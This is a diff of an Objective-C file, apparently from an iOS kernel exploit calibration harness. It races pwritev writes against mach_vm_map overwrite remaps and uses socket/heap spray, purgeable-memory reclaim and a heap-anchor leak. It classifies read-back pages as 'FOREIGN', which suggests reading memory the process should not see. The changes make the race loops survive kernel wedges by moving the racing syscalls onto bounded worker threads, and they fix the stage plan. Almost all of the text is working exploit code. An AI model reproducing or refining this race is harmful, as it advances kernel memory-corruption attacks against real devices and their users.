@@ -1,6 +1,12 @@
 // LSIDCalib.m
-// v10: Hot-Replay Tuner (ID-sweep choreography, unsplit, spray-ON) + cross-boot hot-offset persistence
-// (v8 was the sock_DGRAM spray ID sweep; v9 split-sampler demoted to negative control)
+// v11 (2026-11-19) PERMANENT PLAN: no knob files, no auto rotation. Default tap =
+//   H control + ID sweep + v10 hot replay + v14 reclaim. v12/v12.2 arm-gated
+//   (cscalib_v12_arm.txt, stall class, fully bounded); v13 arm-gated
+//   (cscalib_v13_arm.txt, CRASH class — it took down the main app once).
+//   EVERY racing-loop kernel call (pwritev/pwrite/pread) runs on a bounded
+//   worker: a wedge parks one thread and the tap moves on. The a11a M0 tag is
+//   RETIRED: fill = same-boot heap anchor (p159 first) else the per-boot hmarker.
+// v10: Hot-Replay Tuner (ID-sweep choreography, unsplit, spray-ON) + hot-offset persistence
 
 #import "LSIDCalib.h"
 #import "LabKnob.h"
@@ -60,11 +66,6 @@ static int g_rc_log_fd;   /* forward decl: the spray thread's wall diagnostic
    read only "cscali", so UI-set knobs NEVER reached a tap (every install
    ran the default v12+v12.2 plan and stalled at v12). Catalog id first,
    legacy alias second. */
-static int rc_knob(char *out, int cap) {
-    if (LabKnobRead("cscalib", out, cap) == 1) return 1;
-    return LabKnobRead("cscali", out, cap);
-}
-
 /* auto plan (2026-11-15): knob unset → rotate the stall-free stages
    v14 → v13 → v12.2 by least-attempted, history in Documents/calib_plan.txt.
    v12 never auto-runs (pre-write stall law, both devices). Explicit knob
@@ -78,24 +79,6 @@ static void rc_plan_note(const char *stage, unsigned hits) {
     rc_plan_path(p, sizeof p);
     FILE *f = fopen(p, "a");
     if (f) { fprintf(f, "%s hits=%u\n", stage, hits); fclose(f); }
-}
-static const char *rc_auto_pick(void) {
-    char p[1200];
-    rc_plan_path(p, sizeof p);
-    unsigned n14 = 0, n13 = 0, n122 = 0;
-    FILE *f = fopen(p, "r");
-    if (f) {
-        char line[128];
-        while (fgets(line, sizeof line, f)) {
-            if (strncmp(line, "v14", 3) == 0) n14++;
-            else if (strncmp(line, "v13", 3) == 0) n13++;
-            else if (strncmp(line, "v12.2", 5) == 0) n122++;
-        }
-        fclose(f);
-    }
-    if (n14 <= n13 && n14 <= n122) return "v14";
-    if (n13 <= n122) return "v13";
-    return "v12.2";
 }
 
 /* ---- v13 RECLAIM machinery (purgeable state-1 feed) --------------------
@@ -294,6 +277,8 @@ static void *rc_socket_spray_thread(void *arg) {
    harmless), caller decides (munlock/teardown/continue). */
 static volatile int rc_pwritev_done14 = 0;
 static volatile int rc_pwritev_rv14 = 0;
+static volatile int rc_pwritev_errno14 = 0;   /* worker-side errno stash */
+static int rc_pwritev_errno_out14 = 0;        /* waiter-published errno */
 /* 2026-11-19 freeze fix: the old waiter called pthread_cond_timedwait on a
    condvar NOBODY signals, with the mutex not held (UB) — the fast path
    burned the full 5 s budget on EVERY call and the wedge path relied on
@@ -305,9 +290,11 @@ static pthread_mutex_t rc_pw14_mu = PTHREAD_MUTEX_INITIALIZER;
 static pthread_cond_t  rc_pw14_cv = PTHREAD_COND_INITIALIZER;
 static void *rc_pw14_worker(void *arg) {
     struct rc_pw14_args *a = (struct rc_pw14_args *)arg;
+    errno = 0;
     ssize_t w = pwritev(a->fd, &a->iov, 1, a->ofs);
     pthread_mutex_lock(&rc_pw14_mu);
     rc_pwritev_rv14 = (int)w;
+    rc_pwritev_errno14 = (w < 0) ? errno : 0;
     rc_pwritev_done14 = 1;
     pthread_cond_broadcast(&rc_pw14_cv);
     pthread_mutex_unlock(&rc_pw14_mu);
@@ -321,7 +308,7 @@ static int rc_pwritev_bounded14(int fd, void *base, size_t len, off_t ofs, uint6
     pthread_mutex_unlock(&rc_pw14_mu);
     pthread_t th;
     if (pthread_create(&th, NULL, rc_pw14_worker, &args) != 0)
-        return (int)pwritev(fd, base, len, ofs);   /* rare sync fallback */
+        return -2;   /* NEVER a sync fallback — a spawn failure is a bounded miss */
     struct timespec ts; clock_gettime(CLOCK_REALTIME, &ts);
     ts.tv_sec += (time_t)(ms / 1000);
     ts.tv_nsec += (long)(ms % 1000) * 1000000L;
@@ -331,7 +318,48 @@ static int rc_pwritev_bounded14(int fd, void *base, size_t len, off_t ofs, uint6
     while (!rc_pwritev_done14) {
         if (pthread_cond_timedwait(&rc_pw14_cv, &rc_pw14_mu, &ts) == ETIMEDOUT) break;
     }
-    if (rc_pwritev_done14) rv = rc_pwritev_rv14;
+    if (rc_pwritev_done14) { rv = rc_pwritev_rv14; rc_pwritev_errno_out14 = rc_pwritev_errno14; }
+    else rc_pwritev_errno_out14 = -1;   /* timeout: no errno */
+    pthread_mutex_unlock(&rc_pw14_mu);
+    pthread_detach(th);
+    return rv;
+}
+/* generic bounded pread (kind 2) / pwrite (kind 1) on the same protocol.
+   2026-11-19 permanent bounding: a wedged racing-loop syscall parks ONE
+   worker in-kernel and the tap moves on — the hang class is dead. */
+struct rc_fd14_args { int kind; int fd; void *buf; size_t len; off_t ofs; };
+static void *rc_fd14_worker(void *arg) {
+    struct rc_fd14_args *a = (struct rc_fd14_args *)arg;
+    errno = 0;
+    ssize_t w = (a->kind == 2) ? pread(a->fd, a->buf, a->len, a->ofs)
+                                : pwrite(a->fd, a->buf, a->len, a->ofs);
+    pthread_mutex_lock(&rc_pw14_mu);
+    rc_pwritev_rv14 = (int)w;
+    rc_pwritev_errno14 = (w < 0) ? errno : 0;
+    rc_pwritev_done14 = 1;
+    pthread_cond_broadcast(&rc_pw14_cv);
+    pthread_mutex_unlock(&rc_pw14_mu);
+    return NULL;
+}
+static int rc_fd_bounded(int kind, int fd, void *buf, size_t len, off_t ofs, uint64_t ms) {
+    static struct rc_fd14_args args;
+    args.kind = kind; args.fd = fd; args.buf = buf; args.len = len; args.ofs = ofs;
+    pthread_mutex_lock(&rc_pw14_mu);
+    rc_pwritev_done14 = 0; rc_pwritev_rv14 = 0; rc_pwritev_errno14 = 0;
+    pthread_mutex_unlock(&rc_pw14_mu);
+    pthread_t th;
+    if (pthread_create(&th, NULL, rc_fd14_worker, &args) != 0) return -2;
+    struct timespec ts; clock_gettime(CLOCK_REALTIME, &ts);
+    ts.tv_sec += (time_t)(ms / 1000);
+    ts.tv_nsec += (long)(ms % 1000) * 1000000L;
+    if (ts.tv_nsec >= 1000000000L) { ts.tv_sec += 1; ts.tv_nsec -= 1000000000L; }
+    int rv = -2;
+    pthread_mutex_lock(&rc_pw14_mu);
+    while (!rc_pwritev_done14) {
+        if (pthread_cond_timedwait(&rc_pw14_cv, &rc_pw14_mu, &ts) == ETIMEDOUT) break;
+    }
+    if (rc_pwritev_done14) { rv = rc_pwritev_rv14; rc_pwritev_errno_out14 = rc_pwritev_errno14; }
+    else rc_pwritev_errno_out14 = -1;
     pthread_mutex_unlock(&rc_pw14_mu);
     pthread_detach(th);
     return rv;
@@ -530,7 +558,8 @@ static void rc_aim(const uint64_t *rbBuf, uint32_t cls, int fdMark,
     if (kn == 0) {
         for (int st = 1; st <= 4; st++) {
             uint8_t wb[RC_NQ * 8];
-            ssize_t wn = pread(fdMark, wb, sizeof(wb), (off_t)off + 0x4000 + (off_t)st * (off_t)vm_page_size);
+            ssize_t wn = (ssize_t)rc_fd_bounded(2, fdMark, wb, sizeof(wb),
+                                 (off_t)off + 0x4000 + (off_t)st * (off_t)vm_page_size, 5000);
             if (wn < 8) break;
             uint64_t *wq8 = (uint64_t *)wb;
             int wkn = 0, wcont = 0; uint64_t wfirst = 0;
@@ -678,14 +707,14 @@ static CFNumberRef RCNUM(int64_t v) {
        with the spray tag; anything foreign lands as an honest FOREIGN. */
     uint64_t m0;
     {
-        char knobv[32];
-        g_rcUntagged = (rc_knob(knobv, (int)sizeof knobv) == 1)
-                       && (strncmp(knobv, "untagged", 8) == 0);
-        /* anchor-tag (2026-11-19): a REAL same-boot heap leak beats the
-           a11a constant; the explicit untagged knob still wins. The anchor
-           is excluded from every shape classifier below. */
-        g_rcAnchor = g_rcUntagged ? 0 : LabHeapAnchorSameBoot();
-        m0 = g_rcUntagged ? hmarker : (g_rcAnchor ? g_rcAnchor : M0_TAG);
+        /* 2026-11-19 PERMANENT PLAN — no knob files. The a11a constant is
+           RETIRED (the bandit's own recommendation: a fixed mark confuses
+           own pages). fill = the same-boot REAL heap anchor when one
+           exists (p159 first), else the per-boot hmarker. The anchor is
+           excluded from every shape classifier below. */
+        g_rcAnchor = LabHeapAnchorSameBoot();
+        m0 = g_rcAnchor ? g_rcAnchor : hmarker;
+        g_rcUntagged = (g_rcAnchor == 0);   /* bandit-arm bookkeeping only */
     }
     memset_pattern8((void *)pcBig, &m0, 0x8000);
     rc_log("pcBig=0x%llx M0_TAG=0x%llx spray=%s fill=0x%llx (page2 qword=0x%llx)",
@@ -805,12 +834,12 @@ static CFNumberRef RCNUM(int64_t v) {
             mach_vm_map(mach_task_self(), &a, 0x2000, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pcObjSmall, 0, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
             *(uint64_t *)(pcSmall + 0x3f00) = hmarker;
             rc_raceOn = 1;
-            ssize_t w = pwritev(fdZero, &iov, 1, 0x3f00);
+            ssize_t w = (ssize_t)rc_pwritev_bounded14(fdZero, iov.iov_base, iov.iov_len, 0x3f00, 5000);
             if (rc_raceOn_wait(5000) < 0) { rc_log("[H STALL] swap wedged >5 s (kernel) — H control aborted"); break; }
-            if (w == -1) {
+            if (w < 0) {   /* -1 = write failed; -2 = wedged >5 s (bounded miss) */
                 wFail++;
                 uint64_t rb = 0;
-                pread(fdZero, &rb, 8, 0x3f00);
+                (void)rc_fd_bounded(2, fdZero, &rb, 8, 0x3f00, 5000);
                 if (rb != hmarker) hits++;
             }
         }
@@ -842,14 +871,14 @@ static CFNumberRef RCNUM(int64_t v) {
             mach_vm_address_t a = pcBig;
             mach_vm_map(mach_task_self(), &a, 0x8000, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pcObjBig, 0, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
             memset_pattern8((void *)pcBig, &m0, 0x8000);
-            pwrite(fdMark, zreset, sizeof(zreset), 0x3f00);
+            (void)rc_fd_bounded(1, fdMark, (void *)zreset, sizeof(zreset), 0x3f00, 5000);
 
             rc_raceOn = 1;
-            ssize_t w = pwritev(fdMark, &iov, 1, 0x3f00);
-            int e = errno;
+            ssize_t w = (ssize_t)rc_pwritev_bounded14(fdMark, iov.iov_base, iov.iov_len, 0x3f00, 5000);
+            int e = (w == -1) ? rc_pwritev_errno_out14 : -1;   /* worker errno; -1 = no write/timeout */
             if (rc_raceOn_wait(5000) < 0) { rc_log("[ID STALL] swap wedged >5 s at off=0x%llx (kernel) — sweep aborted", (unsigned long long)off); break; }
 
-            int isFail = (w == -1);
+            int isFail = (w < 0);
             if (isFail) {
                 nFail++;
                 if (e >= 0 && e < 16) failErrno[e]++;
@@ -857,7 +886,7 @@ static CFNumberRef RCNUM(int64_t v) {
                 nOk++;
             }
 
-            pread(fdMark, rbBuf, sizeof(rbBuf), 0x4000);
+            (void)rc_fd_bounded(2, fdMark, rbBuf, sizeof(rbBuf), 0x4000, 5000);
             uint64_t got = 0; int32_t delta = 0;
             rc_cls_t c = rc_cls(rbBuf, expected, npages, &got, &delta);
             uint64_t *bM0 = isFail ? &flM0 : &okM0;
@@ -963,13 +992,13 @@ static CFNumberRef RCNUM(int64_t v) {
                 mach_vm_map(mach_task_self(), &a, 0x8000, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
                             pcObjBig, 0, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
                 memset_pattern8((void *)pcBig, &m0, 0x8000);
-                pwrite(fdMark, zreset, sizeof(zreset), 0x3f00);
+                (void)rc_fd_bounded(1, fdMark, (void *)zreset, sizeof(zreset), 0x3f00, 5000);
                 struct iovec iovH = { (void *)(pcBig + 0x3f00), 0x4000 };
                 rc_mapAddr = pcBig; rc_mapSize = 0x8000; rc_mapObj = searchObj; rc_mapOff = (mach_vm_offset_t)off;
                 rc_raceOn = 1;
                 { int wH = rc_pwritev_bounded14(fdMark, iovH.iov_base, iovH.iov_len, 0x3f00, 5000); (void)wH; }
                 if (rc_raceOn_wait(5000) < 0) { rc_log("[v10 STALL] swap wedged >5 s at hot 0x%llx (kernel) — tuner aborted", (unsigned long long)off); break; }
-                pread(fdMark, rbBuf, sizeof(rbBuf), 0x4000);
+                (void)rc_fd_bounded(2, fdMark, rbBuf, sizeof(rbBuf), 0x4000, 5000);
                 uint64_t got = 0; int32_t delta = 0;
                 rc_cls_t c2 = rc_cls(rbBuf, pg + 1, npages, &got, &delta);
                 if (c2 == C_WRONG) {
@@ -1055,19 +1084,18 @@ static CFNumberRef RCNUM(int64_t v) {
                     mach_vm_map(mach_task_self(), &a, 0x8000, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
                                 pcObjBig, 0, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
                     memset_pattern8((void *)pcBig, &m0, 0x8000);
-                    pwrite(fdMark, zreset, sizeof(zreset), offList[g]);
+                    (void)rc_fd_bounded(1, fdMark, (void *)zreset, sizeof(zreset), offList[g], 5000);
                     struct iovec iov2 = { (void *)(pcBig + offList[g]), 0x4000 };
                     rc_mapAddr = pcBig; rc_mapSize = 0x4000;  /* swap HALF */
                     rc_mapObj = searchObj; rc_mapOff = off;
                     rc_raceOn = 1;
-                    ssize_t w = pwritev(fdMark, &iov2, 1, offList[g]);
-                    (void)w;
+                    (void)rc_pwritev_bounded14(fdMark, iov2.iov_base, iov2.iov_len, offList[g], 5000);
                     if (us) usleep(us);
                     mach_vm_address_t a2 = pcBig;   /* complete second half inline */
                     mach_vm_map(mach_task_self(), &a2, 0x8000, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
                                 pcObjBig, 0, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
                     rc_raceOn = 0;
-                    pread(fdMark, rbBuf, sizeof(rbBuf), 0x4000);
+                    (void)rc_fd_bounded(2, fdMark, rbBuf, sizeof(rbBuf), 0x4000, 5000);
                     uint64_t got = 0; int32_t delta = 0;
                     rc_cls_t cc = rc_cls(rbBuf, 0, npages, &got, &delta);
                     if (cc == C_WRONG) { hw++; if (hr < 8) { rc_log("  v9 WRONG hot=0x%llx g=0x%x us=%u q0=0x%llx q1=0x%llx", off, offList[g], us, rbBuf[0], rbBuf[1]); hr++; } }
@@ -1086,34 +1114,35 @@ static CFNumberRef RCNUM(int64_t v) {
            purgeable feed (v12's stall at pre-write never reaches it);
            knob "v14" runs ONLY the cs2-order spray-then-reread stage;
            unset/other runs both v12 stages */
-        char knv[32];
-        knv[0] = 0;
-        BOOL g_runWhole = YES, g_runMlock = YES, g_runV13 = NO, g_runV14 = NO;
-        if (rc_knob(knv, (int)sizeof knv) == 1) {
-            if (strncmp(knv, "v12.2", 5) == 0) g_runWhole = NO;
-            else if (strncmp(knv, "v14", 3) == 0) {
-                g_runWhole = NO; g_runMlock = NO; g_runV14 = YES;
+        /* 2026-11-19 PERMANENT PLAN — no knob files, no auto rotation.
+           Receipts that killed the old machinery: v13 CRASHED the main
+           app (purgeable-trap class); the knob/auto picker could hand a
+           fresh install the crash stage unprompted. Default tap =
+           H control + ID sweep + v10 hot replay + v14 reclaim only.
+           The lab stages stay reachable ONLY behind explicit arm files
+           (presence gates, no content parsing — the lswkrw_arm law):
+             Documents/cscalib_v12_arm.txt  -> v12 whole-surface + v12.2
+                                              (the pre-write stall class,
+                                              now fully bounded)
+             Documents/cscalib_v13_arm.txt  -> v13 purgeable feed
+                                              (CRASH class: solo tap,
+                                              fresh boot, expect the .ips)
+        */
+        BOOL g_runWhole = NO, g_runMlock = NO, g_runV13 = NO, g_runV14 = YES;
+        {
+            NSString *docs = [NSSearchPathForDirectoriesInDomains(
+                NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
+            NSFileManager *fm = [NSFileManager defaultManager];
+            if ([fm fileExistsAtPath:[docs stringByAppendingPathComponent:@"cscalib_v12_arm.txt"]]) {
+                g_runWhole = YES; g_runMlock = YES;
+                rc_log("[calib] cscalib_v12_arm.txt present — v12/v12.2 lab stages ARMED (bounded)");
             }
-            else if (strncmp(knv, "v13", 3) == 0) {
-                g_runWhole = NO; g_runMlock = NO; g_runV13 = YES;
+            if ([fm fileExistsAtPath:[docs stringByAppendingPathComponent:@"cscalib_v13_arm.txt"]]) {
+                g_runV13 = YES;
+                rc_log("[calib] cscalib_v13_arm.txt present — v13 purgeable stage ARMED (CRASH class; solo tap, fresh boot)");
             }
-            else if (strncmp(knv, "v12", 3) == 0) g_runMlock = NO;
-            else if (strncmp(knv, "untagged", 8) == 0) { /* spray-mode knob, run both */ }
-        } else {
-            /* AUTO plan: no knob set — rotate stall-free stages, record history */
-            const char *ap = rc_auto_pick();
-            snprintf(knv, sizeof knv, "%s", ap);
-            if (strncmp(knv, "v14", 3) == 0) {
-                g_runWhole = NO; g_runMlock = NO; g_runV14 = YES;
-            } else if (strncmp(knv, "v13", 3) == 0) {
-                g_runWhole = NO; g_runMlock = NO; g_runV13 = YES;
-            } else {
-                g_runWhole = NO; g_runMlock = YES;   /* v12.2 */
-            }
-            rc_log("[calib] AUTO plan=%s (knob unset; explicit knob overrides)", knv);
         }
-        /* receipt law: the knob that THIS tap saw, and the plan it chose */
-        rc_log("[calib] knob cscalib=%s plan=%s%s%s%s", knv[0] ? knv : "(unset)",
+        rc_log("[calib] FIXED plan=%s%s%s%s (no knob files)",
                g_runWhole ? "v12 " : "", g_runMlock ? "v12.2 " : "",
                g_runV13 ? "v13 " : "", g_runV14 ? "v14 " : "");
     /* 2026-11-19 pre-write freeze fix (root cause): v12 / v12.2 / v13 /
@@ -1207,7 +1236,7 @@ static CFNumberRef RCNUM(int64_t v) {
                             VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pcObjBig, 0,
                             false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
                         memset_pattern8((void *)pcBig, &m0, 0x8000);
-                        pwrite(fdMark, zreset, sizeof(zreset), 0x3f00);
+                        (void)rc_fd_bounded(1, fdMark, (void *)zreset, sizeof(zreset), 0x3f00, 5000);
                         struct iovec iov12 = { (void *)(pcBig + 0x3f00), 0x4000 };
                         if (ho == 0 && it2 < 2)
                             rc_log("[v12 stall-probe %d] pre-write", it2);
@@ -1218,7 +1247,7 @@ static CFNumberRef RCNUM(int64_t v) {
                         if (rc_raceOn_wait(5000) < 0) { rc_log("[v12 STALL] swap wedged >5 s at off=0x%llx (kernel) — window aborted", (unsigned long long)off); break; }
                         if (ho == 0 && it2 < 2)
                             rc_log("[v12 stall-probe %d] post-write", it2);
-                        pread(fdMark, rbBuf, sizeof(rbBuf), 0x4000);
+                        (void)rc_fd_bounded(2, fdMark, rbBuf, sizeof(rbBuf), 0x4000, 5000);
                         uint64_t got2 = 0; int32_t delta2 = 0;
                         rc_cls_t c12 = rc_cls(rbBuf, pg + 1, npages, &got2, &delta2);
                         if (c12 == C_WRONG) hw2++;
@@ -1327,14 +1356,14 @@ static CFNumberRef RCNUM(int64_t v) {
                     VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pcObjBig, 0, false,
                     VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
                 memset_pattern8((void *)pcBig, &m0, 0x8000);
-                pwrite(fdMark, zreset, sizeof(zreset), 0x3f00);
+                (void)rc_fd_bounded(1, fdMark, (void *)zreset, sizeof(zreset), 0x3f00, 5000);
                 struct iovec iov22 = { (void *)(pcBig + 0x3f00), 0x4000 };
                 rc_mapAddr = pcBig; rc_mapSize = 0x8000;
                 rc_mapObj = searchObj; rc_mapOff = (mach_vm_offset_t)off;
                 rc_raceOn = 1;
                 { int w22 = rc_pwritev_bounded14(fdMark, iov22.iov_base, iov22.iov_len, 0x3f00, 5000); (void)w22; }   /* was a DIRECT unbounded pwritev */
                 if (rc_raceOn_wait(5000) < 0) { rc_log("[v12.2 STALL] swap wedged >5 s at off=0x%llx (kernel) — stage aborted", (unsigned long long)off); break; }
-                pread(fdMark, rbBuf, sizeof(rbBuf), 0x4000);
+                (void)rc_fd_bounded(2, fdMark, rbBuf, sizeof(rbBuf), 0x4000, 5000);
                 uint64_t got22 = 0; int32_t dlt22 = 0;
                 rc_cls_t c22 = rc_cls(rbBuf, pg22 + 1, npages, &got22, &dlt22);
                 if (c22 == C_FOREIGN) {
@@ -1435,14 +1464,14 @@ static CFNumberRef RCNUM(int64_t v) {
                                 VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pcObjBig, 0, false,
                                 VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
                             memset_pattern8((void *)pcBig, &m0, 0x8000);
-                            pwrite(fdMark, zreset, sizeof(zreset), 0x3f00);
+                            (void)rc_fd_bounded(1, fdMark, (void *)zreset, sizeof(zreset), 0x3f00, 5000);
                             struct iovec iov13 = { (void *)(pcBig + 0x3f00), 0x4000 };
                             rc_mapAddr = pcBig; rc_mapSize = 0x8000;
                             rc_mapObj = searchObj; rc_mapOff = (mach_vm_offset_t)off13;
                             rc_raceOn = 1;
                             { int w13b = rc_pwritev_bounded14(fdMark, iov13.iov_base, iov13.iov_len, 0x3f00, 5000); (void)w13b; }   /* was a DIRECT unbounded pwritev */
                             if (rc_raceOn_wait(5000) < 0) { rc_log("[v13 STALL] swap wedged >5 s at off=0x%llx (kernel) — stage aborted", (unsigned long long)off13); break; }
-                            pread(fdMark, rbBuf, sizeof(rbBuf), 0x4000);
+                            (void)rc_fd_bounded(2, fdMark, rbBuf, sizeof(rbBuf), 0x4000, 5000);
                             uint64_t got13 = 0; int32_t dlt13 = 0;
                             rc_cls_t c13c = rc_cls(rbBuf, pg13 + 1, npages, &got13, &dlt13);
                             if (c13c == C_FOREIGN) {
@@ -1554,7 +1583,7 @@ static CFNumberRef RCNUM(int64_t v) {
                     VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pcObjBig, 0, false,
                     VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
                 memset_pattern8((void *)pcBig, &m0, 0x8000);
-                pwrite(fdMark, zreset, sizeof(zreset), 0x3f00);
+                (void)rc_fd_bounded(1, fdMark, (void *)zreset, sizeof(zreset), 0x3f00, 5000);
                 struct iovec iov14 = { (void *)(pcBig + 0x3f00), 0x4000 };
                 rc_mapAddr = pcBig; rc_mapSize = 0x8000;
                 rc_mapObj = searchObj; rc_mapOff = (mach_vm_offset_t)off;
@@ -1566,7 +1595,7 @@ static CFNumberRef RCNUM(int64_t v) {
                 }
                 if (rc_raceOn_wait(5000) < 0) { rc_log("[v14 STALL] swap wedged >5 s at off=0x%llx (kernel) — window aborted", (unsigned long long)off); break; }
                 if (it14 == 0) rc_log("[v14] window %u post-write", ci);
-                pread(fdMark, rbBuf, sizeof(rbBuf), 0x4000);
+                (void)rc_fd_bounded(2, fdMark, rbBuf, sizeof(rbBuf), 0x4000, 5000);
                 uint64_t got14 = 0; int32_t dlt14 = 0;
                 rc_cls_t c14 = rc_cls(rbBuf, pg14 + 1, npages, &got14, &dlt14);
                 if (c14 == C_FOREIGN) {
